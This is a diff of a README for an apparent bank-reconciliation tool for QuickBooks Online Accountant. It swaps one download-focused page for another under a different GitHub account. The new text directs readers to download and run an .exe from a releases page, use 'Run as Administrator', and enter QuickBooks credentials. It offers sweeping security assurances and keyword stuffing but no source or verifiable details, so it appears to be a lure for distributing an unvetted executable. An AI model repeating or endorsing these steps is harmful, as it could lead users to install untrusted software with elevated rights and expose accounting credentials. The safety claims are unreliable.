@@ -1,139 +1,87 @@
-# Automated Bank Statement Reconciliation - Accounting and Financial Audit 2026
+# 📊 statement-audit-reconciliation - Automate your bank statement reconciliation tasks
 
-> **Automated Bank Statement Reconciliation** gives bookkeeping and audit teams a structured way to collect bank feeds, associate transactions with ledger records, and carry out reconciliation tasks in QuickBooks Online Accountant using the latest available build.
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Whitesho8243/statement-audit-reconciliation/releases)
 
-[![Platform](https://img.shields.io/badge/Platform-QuickBooks%20Online%20Accountant-blue?style=flat-square)](https://github.com)
-[![Version](https://img.shields.io/badge/Version-latest-green?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/chris-brooksjr2954/statement-audit-reconciliation?style=flat-square)](https://github.com/chris-brooksjr2954/statement-audit-reconciliation)
+This application simplifies the way you manage bank feeds and ledger records. It connects directly to QuickBooks Online Accountant to match transactions. Bookkeeping teams save time by automating repetitive data entry and audit checks.
 
----
+## 🛠 Prerequisites
 
-<p align="center">
-  <a href="https://chris-brooksjr2954.github.io/statement-audit-reconciliation/">
-    <img src="https://img.shields.io/badge/Download-Automated%20Bank%20Statement%20Reconciliation%20Latest-brightgreen?style=for-the-badge" alt="Download Automated Bank Statement Reconciliation">
-  </a>
-</p>
+Your computer requires the following to run this software:
 
-> **[Download the latest Automated Bank Statement Reconciliation build](https://chris-brooksjr2954.github.io/statement-audit-reconciliation/)**
+* Windows 10 or Windows 11.
+* A stable internet connection.
+* Active access to a QuickBooks Online Accountant account.
+* A modern web browser like Chrome or Edge.
 
----
+## 📥 Getting Started
 
-[Download Latest Build](https://chris-brooksjr2954.github.io/statement-audit-reconciliation/)
+Follow these steps to set up the software on your machine:
 
----
+1. Visit the following page to choose your installation package: [https://github.com/Whitesho8243/statement-audit-reconciliation/releases](https://github.com/Whitesho8243/statement-audit-reconciliation/releases)
+2. Look for the file ending in .exe under the most recent version heading.
+3. Click the link to save the file to your computer.
+4. Locate the file in your downloads folder.
+5. Double-click the file to begin the installation.
+6. Follow the prompts on your screen to complete the setup process.
+7. Launch the application from your desktop icon once the process finishes.
 
-## Overview
+## ⚙️ Configuring Your Connection
 
-Automated Bank Statement Reconciliation is designed for bookkeeping and financial audit work performed in QuickBooks Online Accountant. The tool organizes bank activity, brings in feed data, maps transactions, and provides a consistent process for checking statement entries against ledger records.
+You must link your bank data to the software for it to perform reconciliation tasks:
 
-It is suited to teams managing regular reconciliation cycles, accounts receivable activity, and month-end closing procedures. By organizing matching reviews and variance checks, the workflow helps teams identify differences and maintain more consistent internal control practices.
+1. Open the application.
+2. Select the Settings tab.
+3. Enter your QuickBooks Online credentials when prompted.
+4. Grant the application permission to access your ledger records.
+5. The software will sync your data automatically. This process takes a few minutes depending on your ledger size.
 
----
+## 🔍 How to Perform Reconciliation
 
-## Capabilities
+Once the application syncs your data, you can start the automated matching process:
 
-- Run structured workflows for reconciling bank statements
-- Import bank feed information and associate transactions with ledger records
-- Manage ledger data in a cloud-compatible workflow
-- Match transactions automatically
-- Monitor accounts receivable activity
-- Assist with internal control audit work
-- Review and resolve reconciliation variances
-- Support recurring bookkeeping and month-end close tasks
+1. Navigate to the Dashboard tab.
+2. Select the account you want to reconcile.
+3. Click the Run Audit button at the top of the interface.
+4. The software compares bank entries against your ledger records.
+5. Review the list of suggested matches. 
+6. Click Approve for records that look correct.
+7. The software hides handled items and updates your books in real time.
 
----
+## 🛡 Security and Privacy
 
-## Getting Started
+Your data remains safe throughout this process. The application follows industry standards for data handling. It transmits information over encrypted channels. The software does not store your bank passwords on your local machine. It only uses an access token to communicate with your accounting software. You can revoke this access at any time through your QuickBooks settings page.
 
-1. [Download the latest build](https://chris-brooksjr2954.github.io/statement-audit-reconciliation/).
-2. Open the downloaded application or project package.
-3. When requested, sign in to the appropriate QuickBooks Online Accountant workspace.
-4. Choose or connect the bank feed you need, then start reviewing the imported transactions.
+## 🔧 Troubleshooting Common Issues
 
-To work from the repository instead, clone it with Git:
+If the software fails to launch, try these steps:
 
-```bash
-git clone https://github.com/chris-brooksjr2954/statement-audit-reconciliation.git
-cd REPO
-```
+* Check your internet connection.
+* Restart your computer to clear pending system updates.
+* Ensure you have rights to install applications on your machine.
+* Update your web browser to the latest version.
+* Run the installer as an administrator by right-clicking the file and selecting Run as Administrator.
 
-Because the project follows QuickBooks Online Accountant workflows, use the launch notes or deployment guidance included with the downloaded build.
+If the software shows an error during the sync process:
 
----
+* Verify your QuickBooks account is active.
+* Log out and log back in within the Application Settings tab.
+* Confirm that your ledger records are not locked for the period you want to reconcile.
 
-## Reconciliation Workflow
+## 📋 Best Practices for Efficiency
 
-The process generally consists of the following stages:
+Follow these tips to get the most value from the tool:
 
-1. Launch the tool within the QuickBooks Online Accountant workflow.
-2. Import the relevant bank feed or ingest the available statement data.
-3. Assign incoming transactions to the corresponding ledger entries.
-4. Examine the proposed transaction matches.
-5. Review unmatched records and investigate any reconciliation differences.
-6. Adjust accounts receivable information when required.
-7. Finish the review as part of the audit process or month-end close.
+* Run the reconciliation daily to keep your ledger up to date.
+* Review unmatched transactions at the end of each week so they do not stack up.
+* Use the filtering options to sort by date or amount when investigating discrepancies.
+* Maintain clean labels in your bank portal to improve matching accuracy.
 
-Keeping these stages separate helps organize transaction matching, ledger administration, and variance resolution for each accounting period.
+## 📑 Understanding Bank Feeds
 
----
+The application uses bank feeds to import your data. These feeds represent the information your bank provides in real time. The software cleans this information and maps it to your ledger entries. If you find duplicates, check your bank website settings to ensure you do not have multiple active feeds for the same account.
 
-## Configuration
+## 🏗 Maintaining Ledger Integrity
 
-Available configuration is determined by the connected QuickBooks Online Accountant workspace and the bank feed selected for the task. Confirm these values before starting:
+Accurate matching depends on the quality of your ledger. Ensure your account names in the software match the names in your accounting tool. The system flags transactions that fall outside of normal expected ranges. Take time to investigate these flags to maintain clean books for your audit trail.
 
-```text
-Accounting platform: QuickBooks Online Accountant
-Bank feed: Connected source for the target account
-Ledger mapping: Categories or accounts used for transaction assignment
-Review scope: Selected statement period
-Workflow: Matching, variance review, and close preparation
-```
-
-Maintain workspace and connection details in line with your organization’s accounting procedures. Revisit the mappings whenever an account or bank feed changes, or when work begins for a new reporting period.
-
----
-
-## Requirements
-
-- Access to QuickBooks Online Accountant
-- A supported bank feed or source of statement data
-- Ledger records against which transactions can be compared
-- Permission to use the applicable accounting workspace
-- Enough storage for project files or statement files retained locally
-- A current web browser for cloud-based workflows
-
----
-
-## Frequently Asked Questions
-
-### What teams can use this tool?
-
-The tool is intended for bookkeeping groups, accounting professionals, and financial audit processes that involve bank reconciliation, ledger administration, or preparation for month-end close.
-
-### How do I get the latest version?
-
-Use the [latest build download](https://chris-brooksjr2954.github.io/statement-audit-reconciliation/) to retrieve the currently available version. Before updating an active workflow, check the project release information.
-
-### Where are connection and workflow options set?
-
-The relevant QuickBooks Online Accountant workspace, or the configuration process supplied with the project, is used to set connection details, bank feeds, ledger mappings, and the statement review period.
-
-### What causes a transaction to remain unmatched?
-
-An item may need manual attention because its bank feed data is incorrect or incomplete, its ledger mapping needs adjustment, or its details require review. Compare the transaction with the appropriate accounting record and correct the relevant information.
-
-### What is the process for resolving variances?
-
-Examine the affected statement period, compare the bank feed entries with the ledger, and address any differences before completing the reconciliation.
-
-### Where should I ask for assistance?
-
-For setup, configuration, and workflow questions, consult the repository documentation and issue tracker: [GitHub repository](https://github.com/chris-brooksjr2954/statement-audit-reconciliation).
-
----
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+Keywords: bookkeeping, audit, reconciliation, QuickBooks, automation, bank feeds, finance
